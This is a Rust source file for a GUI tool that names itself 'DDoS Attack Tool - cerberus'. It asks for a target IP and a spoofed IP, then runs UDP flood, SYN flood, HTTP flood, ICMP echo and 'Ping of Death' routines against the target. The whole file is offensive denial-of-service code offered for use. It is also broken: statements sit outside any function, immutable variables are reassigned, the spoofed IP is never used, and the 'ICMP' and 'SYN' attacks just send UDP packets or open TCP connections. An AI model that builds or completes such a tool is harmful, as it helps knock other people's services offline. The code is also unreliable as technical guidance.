use std::thread;
use std::time::Duration;
use std::sync::mpsc;
use std::sync::Arc;
use std::sync::Mutex;

use reqwest;
use rand::Rng;
use tk::prelude::*;

// ASCII art for the tool's name
const CERBERUS_ASCII_ART: &str = "
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXWWWWWWWWWWXXWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXl,OWWWWWWWW0;:KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNo. ,kWWWWWWO;. :XWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWk. ...dNWWNx...  oWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc  ..  ':c;. .'  ,KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc             .  ,KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc                '0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc    .'.  .,.    '0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWXdoKMWWWWWWWWx.  .;;.   ;:'   cXWWWWWWWWXdxXWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWX0xc. .kWWNXXWWWWNd.  .:.   ;,   :XMWWWNNWWWO. 'lkKNWWWWWWWWWWWWWW
WWWWWWWWWWWXx:..    .:c;,'oNWWWNo..           .:KWWWNx,;clc.    .':xXWWWWWWWWWWW
WWWWWWWWNkc.        .     .;dKWk. .          .. oWXk:.     .        'cONWWWWWWWW
WWWWWWWKo'         ..        ok'   .        ..  .xd.       ..         .l0WWWWWWW
WWWWWWNo:c:,                .:.    ..       .    .c.        .       ';:coXWWWWWW
WWWWWW0,.',.       ..       ;;      ........      ::       ..       .;,.,0WWWWWW
WWWWNO;            .        ',                    ..        .            ;OWWWWW
WWWKl.            '.        ;'                    .,        ...           .lKWWW
WNk'     ..       .         ':.                  .:,         .        .     'kNW
MO.   ...';codxkkxdc.        ,'                  .,        .:lddddol:,....   .kW
WNklc::oOXWWWWWWWWWWXl        ..                ..        :0WWWWWWWWWNKko:;:cxXW
WWWWWNWWWWWWWWWWWWWWWk.        .'              ''        .xWWWWWWWWWWWWWWWXNWWWW
WWWWWWWWWWWWWWWWWWWWW0d,        ,c.          .c:        'oONWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWKl,.      'c'        .c,      ..:0WWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWNNKxc;.   .;;.    .;:.   .,:o0XNWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXko:'.,;'..':,..;lx0NWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXOO0K00kk0XWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
MWWWMWWWWWWWWWWMWWWMWWWMWWWWWWWWWWMWWWMWWWWMWWWWWWWWWWMWWWMWWWMWWWMWWWWWWWWWWMWW

";

// Constants for data transfer size
const BYTES_PER_GB: u64 = 1024 * 1024 * 1024;

// Calculate the packet size based on the ASCII art
let packet_size = CERBERUS_ASCII_ART.len();

// Set the data transfer size to 1 GB
let data_transfer_size = BYTES_PER_GB;

// Create the GUI window
let root = tk::Tk::new();
root.title("DDoS Attack Tool - cerberus");

// Create the input fields for target IP address, spoofed IP address, port number, number of packets, and burst interval
tk::Label::new(&root, "Enter IP Address of The Target").pack();
let target_entry = tk::Entry::new(&root);
target_entry.pack();

tk::Label::new(&root, "Enter The Spoofed IP Address").pack();
let fake_ip_entry = tk::Entry::new(&root);
fake_ip_entry.pack();

tk::Label::new(&root, "Enter The Port Number").pack();
let port_entry = tk::Entry::new(&root);
port_entry.pack();

tk::Label::new(&root, "Enter Number of Packets to Send").pack();
let num_packets_entry = tk::Entry::new(&root);
num_packets_entry.pack();

tk::Label::new(&root, "Enter Burst Interval (in seconds)").pack();
let burst_interval_entry = tk::Entry::new(&root);
burst_interval_entry.pack();

// Create the attack type selection menu
tk::Label::new(&root, "Select Attack Type").pack();
let attack_type_entry = tk::StringVar::new(&root);
attack_type_entry.set("UDP Flood");  // Default attack type

let attack_type_options = [
    "UDP Flood", "ICMP Echo", "SYN Flood", "HTTP Flood", "Ping of Death"
];

let attack_type_menu = tk::OptionMenu::new(&root, &attack_type_entry, &attack_type_options);
attack_type_menu.pack();

// Define the attack functions for each attack type
fn udp_flood_attack(target: &str, port: u16, num_packets: u32, burst_interval: f64) {
    let mut attack_num = 0;

    for _ in 0..num_packets {
        let mut rng = rand::thread_rng();
        let packet = vec![0u8; packet_size];
        let mut buffer = [0u8; 1024];
        rng.fill(&mut buffer[..]);

        let socket = std::net::UdpSocket::bind("0.0.0.0:0").unwrap();
        socket.send_to(&packet, format!("{}:{}", target, port)).unwrap();
        attack_num += 1;
        println!("Sent {} packet to {} through port: {}", attack_num, target, port);
        port = (port + 1) % 65535;
        std::thread::sleep(Duration::from_secs_f64(burst_interval));
    }
}

fn icmp_echo_attack(target: &str, num_packets: u32, burst_interval: f64) {
    let mut attack_num = 0;

    for _ in 0..num_packets {
        let packet = vec![0u8; packet_size];
        let socket = std::net::UdpSocket::bind("0.0.0.0:0").unwrap();
        socket.send_to(&packet, target).unwrap();
        attack_num += 1;
        println!("Sent {} ICMP echo request to {}", attack_num, target);
        std::thread::sleep(Duration::from_secs_f64(burst_interval));
    }
}

fn syn_flood_attack(target: &str, port: u16, num_packets: u32, burst_interval: f64) {
    let mut attack_num = 0;

    for _ in 0..num_packets {
        let mut rng = rand::thread_rng();
        let packet = vec![0u8; packet_size];
        let mut buffer = [0u8; 1024];
        rng.fill(&mut buffer[..]);

        let socket = std::net::TcpStream::connect(format!("{}:{}", target, port)).unwrap();
        socket.write(&packet).unwrap();
        attack_num += 1;
        println!("Sent {} SYN packet to {} through port: {}", attack_num, target, port);
        port = (port + 1) % 65535;
        std::thread::sleep(Duration::from_secs_f64(burst_interval));
    }
}

fn http_flood_attack(target: &str, port: u16, num_packets: u32, burst_interval: f64) {
    let mut attack_num = 0;

    for _ in 0..num_packets {
        let url = format!("http://{}:{}/", target, port);
        let client = reqwest::blocking::Client::new();
        let _response = client.get(&url).send();
        attack_num += 1;
        println!("Sent {} HTTP request to {}", attack_num, url);
        std::thread::sleep(Duration::from_secs_f64(burst_interval));
    }
}

fn ping_of_death_attack(target: &str, num_packets: u32, burst_interval: f64) {
    let mut attack_num = 0;

    for _ in 0..num_packets {
        let packet = vec![b'X'; 60000];
        let socket = std::net::UdpSocket::bind("0.0.0.0:0").unwrap();
        socket.send_to(&packet, target).unwrap();
        attack_num += 1;
        println!("Sent {} oversized ICMP packet to {}", attack_num, target);
        std::thread::sleep(Duration::from_secs_f64(burst_interval));
    }
}

// Define the function to start the attack
fn start_attack() {
    let target = target_entry.get();
    let fake_ip = fake_ip_entry.get();
    let port = port_entry.get().parse::<u16>().unwrap();
    let num_packets = num_packets_entry.get().parse::<u32>().unwrap();
    let burst_interval = burst_interval_entry.get().parse::<f64>().unwrap();

    let attack_type = attack_type_entry.get();  // Get the selected attack type from the GUI

    match attack_type {
        "UDP Flood" => {
            let target = target.to_string();
            let port = port.clone();
            let num_packets = num_packets.clone();
            let burst_interval = burst_interval.clone();
            thread::spawn(move || {
                udp_flood_attack(&target, port, num_packets, burst_interval);
            });
        },
        "ICMP Echo" => {
            let target = target.to_string();
            let num_packets = num_packets.clone();
            let burst_interval = burst_interval.clone();
            thread::spawn(move || {
                icmp_echo_attack(&target, num_packets, burst_interval);
            });
        },
        "SYN Flood" => {
            let target = target.to_string();
            let port = port.clone();
            let num_packets = num_packets.clone();
            let burst_interval = burst_interval.clone();
            thread::spawn(move || {
                syn_flood_attack(&target, port, num_packets, burst_interval);
            });
        },
        "HTTP Flood" => {
            let target = target.to_string();
            let port = port.clone();
            let num_packets = num_packets.clone();
            let burst_interval = burst_interval.clone();
            thread::spawn(move || {
                http_flood_attack(&target, port, num_packets, burst_interval);
            });
        },
        "Ping of Death" => {
            let target = target.to_string();
            let num_packets = num_packets.clone();
            let burst_interval = burst_interval.clone();
            thread::spawn(move || {
                ping_of_death_attack(&target, num_packets, burst_interval);
            });
        },
        _ => {
            println!("Invalid attack type selected.");
            return;
        }
    }
}

// Create the start attack button
tk::Button::new(&root, "Start Attack", start_attack).pack();

// Run the GUI main loop
root.mainloop();
